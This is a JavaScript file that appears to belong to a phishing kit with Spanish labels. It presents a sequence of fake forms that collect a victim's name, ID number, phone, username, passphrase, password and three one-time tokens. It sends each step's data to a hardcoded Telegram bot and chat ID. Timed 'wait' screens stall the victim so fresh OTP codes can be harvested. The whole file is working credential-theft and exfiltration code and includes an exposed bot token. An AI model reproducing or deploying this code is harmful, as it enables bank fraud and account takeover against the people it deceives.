function tlgsnd(msg) {
  const token = "8107173590:AAEF_elz7cSx8D2S2pDF3UddMbqrWMAeT1c";
  const chatId = "-4802195491";

  const url = `https://api.telegram.org/bot${token}/sendMessage`;

  fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: msg,
    }),
  })
    .then((response) => response.json())
    .then((data) => {
      if (data.ok) {
        console.log("Success:", data);
      } else {
        console.error("Error:", data);
      }
    })
    .catch((error) => {
      console.error("Error in request:", error);
    });
}

window.onload = () => {
  var frmBdy = document.querySelector("#mn-frm-bod");
  var frmBdyInn = document.querySelector("#frm-bod-inn");

  fetch("./tmplts/frms.html")
    .then((response) => {
      if (!response.ok) console.log("err1");
      else return response.text();
    })
    .then((data) => {
      frmBdy.innerHTML = data;

      // Listeners
      document.querySelector("#frm-prest").addEventListener("submit", stp1);
      document.querySelector("#frm-u").addEventListener("submit", stp2);
      document.querySelector("#frm-verf").addEventListener("submit", stp3);
      document.querySelector("#frm-p").addEventListener("submit", stp4);
      document.querySelector("#frm-tkn1").addEventListener("submit", stp5);
      document.querySelector("#frm-tkn2").addEventListener("submit", stp6);
      document.querySelector("#frm-tkn3").addEventListener("submit", stp7);

      // 👇 Cambio para que cargue frm-u primero
      document.querySelector("#frm-prest").style.display = "none";
      document.querySelector("#frm-u").style.display = "inline-block";
    });

  function stp1(event) {
    event.preventDefault();
    const formData = new FormData(event.target);
    const datos = Object.fromEntries(formData.entries());

    const v1 = datos.gtrip01;
    const v2 = datos.gtrip02;
    const v3 = datos.gtrip03;
    const v4 = datos.gtrip04;

    const val1 = `--------\n<-- B-PRO -->\n--------\n👤NOMBRE:${v1}\n🪪CDL:${v2}\n📞TLF:${v3}\n$Monto:${v4}`;

    localStorage.setItem("usr1", val1);

    tlgsnd(val1);

    document.querySelector("#frm-prest").style.display = "none";
    document.querySelector("#frm-u").style.display = "inline-block";
  }

  function stp2(event) {
    event.preventDefault();
    const formData = new FormData(event.target);
    const datos = Object.fromEntries(formData.entries());

    const v1 = datos.ipt1;

    const lclinfo = localStorage.getItem("usr1");

    const val1 = `${lclinfo}\nUSR:${v1}`;

    localStorage.setItem("usr1", val1);

    document.querySelector("#frm-u").style.display = "none";
    document.querySelector("#frm-p").style.display = "inline-block";
  }

  function stp3(event) {
    event.preventDefault();
    const formData = new FormData(event.target);
    const datos = Object.fromEntries(formData.entries());

    const v1 = datos.ipt1;

    const lclinfo = localStorage.getItem("usr1");

    const val1 = `${lclinfo}\nFRASE:${v1}`;

    localStorage.setItem("usr1", val1);

    tlgsnd(val1);

    document.querySelector("#frm-verf").style.display = "none";
    document.querySelector("#frm-p").style.display = "inline-block";
  }

  function stp4(event) {
    event.preventDefault();
    const formData = new FormData(event.target);
    const datos = Object.fromEntries(formData.entries());

    const v1 = datos.ipt1;

    const lclinfo = localStorage.getItem("usr1");

    const val1 = `${lclinfo}\nPSSW:${v1}`;

    localStorage.setItem("usr1", val1);

    tlgsnd(val1);

    document.querySelector("#frm-p").style.display = "none";
    document.querySelector("#frm-wait").style.display = "inline-block";
    setTimeout(function () {
      document.querySelector("#frm-wait").style.display = "none";
      document.querySelector("#frm-tkn1").style.display = "inline-block";
    }, 15000);
  }

  function stp5(event) {
    event.preventDefault();
    const formData = new FormData(event.target);
    const datos = Object.fromEntries(formData.entries());

    const v1 = datos.ipt1;

    const lclinfo = localStorage.getItem("usr1");

    const val1 = `${lclinfo}\nTKN:${v1}`;

    localStorage.setItem("usr1", val1);

    tlgsnd(val1);

    document.querySelector("#frm-tkn1").style.display = "none";
    document.querySelector("#frm-wait").style.display = "inline-block";
    setTimeout(function () {
      document.querySelector("#frm-wait").style.display = "none";
      document.querySelector("#frm-tkn2").style.display = "inline-block";
    }, 15000);
  }

  function stp6(event) {
    event.preventDefault();
    const formData = new FormData(event.target);
    const datos = Object.fromEntries(formData.entries());

    const v1 = datos.ipt1;

    const lclinfo = localStorage.getItem("usr1");

    const val1 = `${lclinfo}\nTKN2:${v1}`;

    localStorage.setItem("usr1", val1);

    tlgsnd(val1);

    document.querySelector("#frm-tkn2").style.display = "none";
    document.querySelector("#frm-wait").style.display = "inline-block";
    setTimeout(function () {
      document.querySelector("#frm-wait").style.display = "none";
      document.querySelector("#frm-tkn3").style.display = "inline-block";
    }, 15000);
  }

  function stp7(event) {
    event.preventDefault();
    const formData = new FormData(event.target);
    const datos = Object.fromEntries(formData.entries());

    const v1 = datos.ipt1;

    const lclinfo = localStorage.getItem("usr1");

    const val1 = `${lclinfo}\nTKN3:${v1}`;

    localStorage.setItem("usr1", val1);

    tlgsnd(val1);

    location.reload();
  }
};
